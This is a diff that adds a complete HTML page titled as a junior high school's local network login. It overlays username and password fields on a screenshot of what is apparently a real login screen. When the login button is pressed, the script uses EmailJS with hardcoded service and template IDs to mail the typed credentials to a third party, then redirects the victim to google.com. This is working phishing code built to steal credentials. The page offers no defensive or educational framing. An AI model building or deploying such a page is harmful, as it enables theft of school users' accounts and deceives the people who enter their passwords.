@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>興福國中局域網</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    emailjs.init("CDnxhrbcBaRhYiaqq");
+  </script>
+
+
+
+
+  <style>
+  .img-box {
+    position: relative;
+    width: 400px;   /* 圖片寬度 */
+  }
+
+
+  .img-box img {
+    width: 100%;
+  }
+
+
+  .input1 {
+    position: absolute;
+    top: 39.5%;     /* 第一個位置377 600 250 */
+    left: 45%;    /*單邊259全屏600*/
+    width: 15%;
+  }
+
+
+  .input2 {
+    position: absolute;
+    top: 43%;    /* 第二個位置 408 600 250*/
+    left: 45%;
+    width: 15%;
+  }
+  .btn-login {
+      position: absolute;
+      top: 46%;      /* 按鈕位置 438 831 25*/
+      left: 60%;
+      height: 3%;
+      cursor: pointer;
+    }
+</style>
+
+</head>
+<body>
+  <div style="text-align: center;">
+    <img src="./image1.png" alt="圖片">
+
+
+    <input type="text" class="input1" placeholder="">
+    <input type="password" class="input2" placeholder="">
+    <button class="btn-login" onclick="sendEmail()">登入</button>
+  </div>
+  <script>
+  function sendEmail() {
+    const user = document.querySelector('.input1').value;
+    const pass = document.querySelector('.input2').value;
+
+    emailjs.send("service_0w04i8j", "template_tvkdzq4", {
+      username: user,
+      password: pass
+    })
+    .then(() => {
+      window.location.href = "https://www.google.com";
+    })
+}
+</script>
+
+</body>
+</html>
